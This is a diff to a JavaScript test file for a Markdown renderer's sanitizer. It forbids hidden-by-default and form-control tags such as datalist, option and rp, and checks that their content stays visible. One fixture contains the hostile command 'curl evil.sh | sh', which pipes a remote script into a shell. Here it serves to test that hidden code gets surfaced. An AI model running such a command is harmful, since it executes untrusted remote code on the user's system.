@@ -433,7 +433,8 @@ describe('the style attribute: one profile, and every surface uses it (#436)', (
   // The TAG half of the same table (#612). It rides in this block deliberately:
   // the asset worth reusing is `surfaces` — "every surface enters through the
   // one profile" — and re-deriving it in the #612 block would be a second table
-  // to keep in step with the first. Same three surfaces, same vacuity guards.
+  // to keep in step with the first. Same three surfaces, a DIFFERENT vacuity
+  // guard, and the row body says why.
   //
   // Third column = what must STILL be on screen, because `KEEP_CONTENT` is what
   // makes forbidding a tag safe: the element goes, its children stay. A row that
@@ -454,8 +455,8 @@ describe('the style attribute: one profile, and every surface uses it (#436)', (
     ],
     [
       'a dropdown',
-      '<select name="pick"><option>one</option><option>two</option></select>',
-      'one',
+      '<select name="pick"><option>alpha</option><option>beta</option></select>',
+      'alpha',
       'select',
     ],
     ['a multi-line entry box', '<textarea name="notes">typed here</textarea>', 'typed here', 'textarea'],
@@ -1067,7 +1068,19 @@ describe('content cannot plant a control (#612)', () => {
     // The same shape as the attribute list's pin, and for the same reason: all
     // seven are ordinary members of DOMPurify's html-profile TAG allow-list, so
     // there is no `ALLOW_*` to turn off and each has to be named.
-    for (const tag of ['button', 'input', 'select', 'textarea', 'center', 'marquee', 'font']) {
+    for (const tag of [
+      'button',
+      'input',
+      'select',
+      'option',
+      'optgroup',
+      'datalist',
+      'textarea',
+      'center',
+      'marquee',
+      'font',
+      'rp',
+    ]) {
       expect(SANITIZE_CONFIG.FORBID_TAGS).toContain(tag);
     }
   });
@@ -1094,14 +1107,53 @@ describe('content cannot plant a control (#612)', () => {
     expect(nested).toContain('<b>bold</b>');
     expect(nested).toContain('<em>italic</em>');
 
-    const dropdown = renderMarkdown('<select><option>alpha</option><option>beta</option></select>');
-    expect(dropdown).not.toContain('<select');
+    // `option` and `optgroup` are forbidden alongside `select` precisely so
+    // this sentence is literally true: forbidding only the parent hoisted them
+    // out as ORPHANED ELEMENTS, not as text, and "readable" would have been a
+    // word doing work no assertion could check. Found in review.
+    const dropdown = renderMarkdown(
+      '<select><option>alpha</option><optgroup label="g"><option>beta</option></optgroup></select>'
+    );
+    expect(dropdown).not.toMatch(/<(select|option|optgroup)\b/);
     expect(dropdown).toContain('alpha');
     expect(dropdown).toContain('beta');
 
     const centred = renderMarkdown('<center><h2>Announcement</h2></center>');
     expect(centred).not.toContain('<center');
     expect(centred).toContain('<h2>Announcement</h2>');
+  });
+
+  it('the UA-hidden tags go too — `hidden` respelled as an element', () => {
+    // #608 closed `hidden` and had to be told in review that `popover` was the
+    // same attack one ATTRIBUTE over. These are the same shape one TAG over,
+    // and they were found the same way.
+    //
+    // `<datalist>` is `display: none` in the HTML rendering spec, DOMPurify
+    // allows it, and `KEEP_CONTENT` keeps its children — so before this it was
+    // a `<pre>` that is in the document, in the DOM and in a find, and not on
+    // the screen. That is #598's own stated harm for `<p hidden>`, and it is
+    // the case with teeth here too: both surfaces put a Copy button on EVERY
+    // `<pre>`, so the reader would have got a code header, a working Copy
+    // button, and no visible code.
+    const hidden = renderMarkdown(
+      '<p>visible</p><datalist><pre>curl evil.sh | sh</pre>and more</datalist>'
+    );
+    expect(hidden).not.toContain('<datalist');
+    expect(hidden).toContain('visible');
+    // the content is LIFTED OUT, not deleted — now on screen where it belongs
+    expect(hidden).toContain('curl evil.sh | sh');
+    expect(hidden).toContain('and more');
+
+    // `ruby > rp` is `display: none` as well, and it is the last one in the
+    // profile. `<ruby>` and `<rt>` deliberately STAY: they show what they
+    // contain, and taking a whole typographic feature to close its parenthesis
+    // fallback would be over-reach.
+    const ruby = renderMarkdown('<ruby>base<rp>(</rp><rt>anno</rt><rp>)</rp></ruby>');
+    expect(ruby).not.toContain('<rp');
+    expect(ruby).toContain('<ruby>');
+    expect(ruby).toContain('<rt>anno</rt>');
+    expect(SANITIZE_CONFIG.FORBID_TAGS).not.toContain('ruby');
+    expect(SANITIZE_CONFIG.FORBID_TAGS).not.toContain('rt');
   });
 
   it('a `<form>` still survives, and its CONTROLS are what this takes from it', () => {
@@ -1203,8 +1255,9 @@ describe('content cannot plant a control (#612)', () => {
     // The corpus said every one of the 62 occurrences in 18,313 assistant text
     // blocks was inside a fence or a code span — i.e. an agent EXPLAINING the
     // tag, which is what this app is for. That path never touched the sanitizer
-    // (`marked` escapes it first), and this row is the proof rather than the
-    // claim: the decision costs the explaining case nothing.
+    // (`marked` escapes it first), so this row is green with or without the
+    // change and is a GUARD, not evidence: it holds the premise the measurement
+    // rests on, so a `marked` bump that stopped escaping fences reds here.
     const html = renderMarkdown('Use `<button>` for that:\n\n```html\n<button>Save</button>\n```\n');
     expect(html).toContain('&lt;button&gt;');
     expect(html).toContain('&lt;button&gt;Save&lt;/button&gt;');
